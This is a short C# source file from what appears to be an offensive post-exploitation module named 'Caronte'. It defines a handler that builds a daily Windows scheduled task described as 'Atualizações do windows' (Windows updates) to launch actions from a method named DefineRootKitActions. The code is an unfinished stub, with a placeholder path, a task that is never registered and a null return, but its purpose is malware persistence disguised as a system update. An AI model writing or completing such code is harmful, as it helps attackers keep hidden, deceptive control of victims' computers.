using Barsa.Commons;
using MediatR;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte.Modules.PostExploitation
{
    public class PostExploitCommandHandler : IRequestHandler<PostExploitCommand, CommonResponse>
    {
        public Task<CommonResponse> Handle(PostExploitCommand request, CancellationToken cancellationToken)
        {
            CommonResponse response = null;
            using (TaskService taskService = new())
            {
                TaskDefinition taskDefinition = taskService.NewTask();

                taskDefinition.RegistrationInfo.Description = "Atualizações do windows";
                taskDefinition.Triggers.Add(new DailyTrigger() { DaysInterval = 1 });

                taskDefinition.Actions.AddRange(DefineRootKitActions());
            }
            return response;
        }

        private List<ExecAction> DefineRootKitActions()
        {
            return new List<ExecAction>()
            {
                new ExecAction("path"),
            };
        }
    }
}
